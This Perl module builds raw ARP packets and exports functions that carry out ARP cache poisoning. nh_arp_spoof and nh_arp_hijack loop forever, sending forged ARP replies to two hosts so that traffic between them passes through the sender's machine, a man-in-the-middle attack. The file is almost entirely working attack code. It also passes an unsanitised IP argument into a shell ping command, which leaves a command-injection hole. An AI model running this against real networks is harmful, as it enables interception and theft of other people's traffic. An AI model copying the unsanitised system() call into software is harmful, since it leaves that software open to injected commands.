package net::arp::nh_arp;
use nh_common;
use Net::ARP;
use net::ipv4::nh_ip;
use net::ethernet::nh_eth;
require Exporter;

@ISA = qw(Exporter);
@EXPORT = qw(
                nh_arp_spoof nh_arp_update_cache nh_arp_hijack 
                nh_arp_request_send nh_arp_reply_send 
             );

my $nh_arp_proto = "0806";
my $nh_arp_hardware_size = "06";
my $nh_arp_proto_size = "04";
my $nh_arp_request = "request";           
my $nh_arp_reply = "reply";           
my $nh_arp_request_broadcast = "FF:FF:FF:FF:FF:FF";
my $nh_arp_request_dmac = "000000000000";

my %nh_arp_op_code = (
    $nh_arp_request => "0001",
    $nh_arp_reply => "0002",
);

sub nh_arp_send {
    my $if = shift(@_);
    my $dmac = shift(@_);
    my $smac = shift(@_);
    my $dip = shift(@_);
    my $sip = shift(@_);
    my $ipproto = shift(@_);
    my $arp_op = shift(@_);
    my $eth = $nh_eth_id; 
    my $target_mac;
    my $data;

    $dmac =~ s/://g;
    $smac =~ s/://g;
    if ($arp_op eq $nh_arp_request) {
        $target_mac = $nh_arp_request_dmac;
    } else {
        $target_mac = $dmac;
    }
    $dip = &nh_inet_aton($dip);
    $dip = unpack("H*", $dip);
    $sip = &nh_inet_aton($sip);
    $sip = unpack("H*", $sip);

    $data = $nh_eth_id.$ipproto.$nh_arp_hardware_size.$nh_arp_proto_size;
    $data .= $nh_arp_op_code{$arp_op}.$smac.$sip.$target_mac.$dip;

    &nh_eth_packet_send($if, $dmac, $smac, $nh_arp_proto, $data);
}

sub nh_arp_request_send {
    my $if = shift(@_);
    my $dmac = shift(@_);
    my $smac = shift(@_);
    my $dip = shift(@_);
    my $sip = shift(@_);
    my $ipproto = shift(@_);
 
    return &nh_arp_send($if, $dmac, $smac, $dip, $sip,
            $ipproto, $nh_arp_request); 
}

sub nh_arp_reply_send {
    my $if = shift(@_);
    my $dmac = shift(@_);
    my $smac = shift(@_);
    my $dip = shift(@_);
    my $sip = shift(@_);
    my $ipproto = shift(@_);
 
    return &nh_arp_send($if, $dmac, $smac, $dip, $sip,
            $ipproto, $nh_arp_reply); 
}

sub nh_arp_send_reply {
    my $if = shift(@_);
    my $smac = shift(@_);
    my $dmac1 = shift(@_);
    my $dmac2 = shift(@_);
    my $dip1 = shift(@_);
    my $dip2 = shift(@_);

    nh_arp_reply_send($if, $dmac2, $smac, $dip1, $dip2, $nh_ipv4_id);
    nh_arp_reply_send($if, $dmac1, $smac, $dip2, $dip1, $nh_ipv4_id);
}            

sub nh_arp_update_cache {
    my $dip = shift(@_);

    system("ping -c 1 $dip >/dev/null");
}

sub nh_arp_hijack {
    my $it = shift(@_);
    my $if = shift(@_);
    my $dip1 = shift(@_);
    my $dip2 = shift(@_);
    my $smac;
    my $dmac1;
    my $dmac2;
 
    $smac = Net::ARP::get_mac($if);
    while (1) {
        $dmac1 = Net::ARP::arp_lookup($if, $dip1);
        if ($dmac1 eq "unknown") {
            die("Get mac of $dip1 failed!\n");
        }
        $dmac2 = Net::ARP::arp_lookup($if, $dip2);
        if ($dmac2 eq "unknown") {
            die("Get mac of $dip2 failed!\n");
        }
        &nh_arp_send_reply($if, $smac, $dmac1, $dmac2, $dip1, $dip2); 
        print("$dip1\[$smac\] -> $dip2\[$dmac2\] and $dip2\[$smac\] -> $dip2\[$dmac1\]\n");
        sleep($it);
    }
}

sub nh_arp_spoof {
    my $it = shift(@_);
    my $if = shift(@_);
    my $dip1 = shift(@_);
    my $dip2 = shift(@_);

    &nh_arp_update_cache($dip1);
    &nh_arp_update_cache($dip2);
    &nh_arp_hijack($it, $if, $dip1, $dip2);
}

1;
